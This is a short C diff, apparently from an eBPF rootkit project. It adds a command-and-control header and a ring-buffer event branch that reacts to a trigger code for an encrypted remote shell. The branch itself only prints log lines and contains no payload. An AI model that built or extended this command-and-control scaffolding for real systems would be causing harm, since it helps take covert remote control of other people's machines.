@@ -14,6 +14,7 @@
 
 #include "../common/constants.h"
 #include "../common/map_common.h"
+#include "../common/c&c.h"
 #include "include/utils/files/path.h"
 #include "include/utils/strings/regex.h"
 #include "include/utils/structures/fdlist.h"
@@ -103,8 +104,18 @@ static int handle_rb_event(void *ctx, void *data, size_t data_size){
 
 	}else if(e->event_type == EXIT){
 
+	}else if(e->event_type == COMMAND){
+		printf("%s COMMAND  pid:%d code:%i\n", ts, e->pid, e->code);
+		switch(e->code){
+			case CC_PROT_K3_ENCRYPTED_SHELL_TRIGGER_V1:
+				printf("Starting encrypted connection\n");
+				
+            	break;
+			default:
+				printf("Command received unknown: %d\n", e->code);
+		}
 	}else{
-		printf("UNRECOGNIZED RB EVENT RECEIVED");
+		printf("%s COMMAND  pid:%d code:%i, msg:%s\n", ts, e->pid, e->code, e->message);
 		return -1;
 	}
 
